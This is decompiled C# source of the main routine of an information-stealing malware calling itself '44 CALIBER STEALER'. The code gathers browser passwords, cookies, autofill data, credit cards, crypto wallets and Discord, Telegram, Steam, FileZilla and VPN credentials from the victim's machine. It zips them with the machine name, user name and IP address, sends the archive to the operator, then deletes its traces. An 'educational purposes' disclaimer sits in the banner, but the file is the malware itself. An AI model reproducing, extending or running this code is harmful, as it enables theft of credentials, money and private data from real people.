using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using Ionic.Zip;
using Ionic.Zlib;

internal class Class43
{
	public static void Main(string[] args)
	{
		if (File.Exists(Class38.string_11) || Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length != 1)
		{
			return;
		}
		try
		{
			Directory.CreateDirectory(Class38.string_11);
			List<Thread> list = new List<Thread>();
			list.Add(new Thread((ThreadStart)delegate
			{
				Class57.smethod_0();
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				GClass14.smethod_0();
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Class71.smethod_0();
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Class38.smethod_0();
				Class40.smethod_0();
				Class39.smethod_0();
				Class41.smethod_0();
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Class47.smethod_0();
				Class46.smethod_0();
				Class45.smethod_1();
				Class44.smethod_0();
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Class30.smethod_0();
				Class31.smethod_0();
				Class33.smethod_2();
				Class32.smethod_0();
			}));
			foreach (Thread item in list)
			{
				item.Start();
			}
			foreach (Thread item2 in list)
			{
				item2.Join();
			}
			string text = Class38.string_11 + "\\" + Class41.smethod_4() + Class41.smethod_6() + "(" + Class38.string_13 + ").zip";
			using (GClass9 gClass = new GClass9(Encoding.GetEncoding("cp866")))
			{
				gClass.Int64_0 = -1L;
				gClass.Zip64Option_0 = Zip64Option.Always;
				gClass.CompressionLevel_0 = CompressionLevel.Default;
				gClass.String_2 = "\n ================================================\n ===============44 CALIBER STEALER===============\n ================================================\n Maded by ChaosInsurgency | lolz.guru/thanatophobia\n              telegram @chaosinsurgency          \n Written exclusively for educational purposes! I am not responsible for the use of this project and any of its parts code.";
				gClass.String_4 = Class73.string_0;
				gClass.method_31(Class38.string_11);
				gClass.method_72(text);
			}
			string string_ = "\n :spy: NEW LOG FROM - " + Environment.MachineName + " " + Environment.UserName + " :person_in_manual_wheelchair:\n :eye: IP: " + Class41.smethod_6() + " " + Class41.smethod_5() + "\n :desktop: " + Class41.smethod_1() + "\n ================================\n :key: Passwords - " + Class36.int_0 + "\n :cookie: Cookies - " + Class36.int_3 + "\n :notepad_spiral: AutoFills - " + Class36.int_2 + "\n :credit_card: CC - " + Class36.int_1 + "\n :file_folder: Grabbed Files - " + Class36.int_11 + "\n ================================\n GRABBED SOFTWARE:" + ((Class36.int_8 > 0) ? "\n   Discord" : "") + ((Class36.int_12 > 0) ? "\n   Wallets" : "") + ((Class36.int_7 > 0) ? "\n   Telegram" : "") + ((Class36.int_10 > 0) ? ("\n   FileZilla (" + Class36.int_10 + ")") : "") + ((Class36.int_16 > 0) ? "\n   Steam" : "") + ((Class36.int_13 > 0) ? "\n   NordVPN" : "") + ((Class36.int_14 > 0) ? "\n   OpenVPN" : "") + ((Class36.int_15 > 0) ? "\n   ProtonVPN" : "") + ((Class36.int_9 > 0) ? ("\n   VimeWorld" + (Class73.bool_0 ? (":\n     NickName - " + Class32.smethod_4() + " :\n     Donate - " + Class32.smethod_2() + " :\n     Level - " + Class32.smethod_1()) : "")) : "") + "\n ================================\n DOMAINS DETECTED:\n - " + Class59.smethod_0(Class38.string_11 + "\\Browsers\\");
			string string_2 = Environment.MachineName + "." + Environment.UserName + ".zip";
			string string_3 = "zip";
			string string_4 = text;
			string string_5 = "";
			try
			{
				GClass0.smethod_4(string_, string_2, string_3, string_4, string_5);
			}
			catch
			{
				GClass0.smethod_1("Log size is more then 8 MB. Sending isn`t available.");
			}
			smethod_0();
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}

	private static void smethod_0()
	{
		Thread.Sleep(15000);
		Directory.Delete(Class38.string_11 + "\\", recursive: true);
		Environment.Exit(0);
	}
}
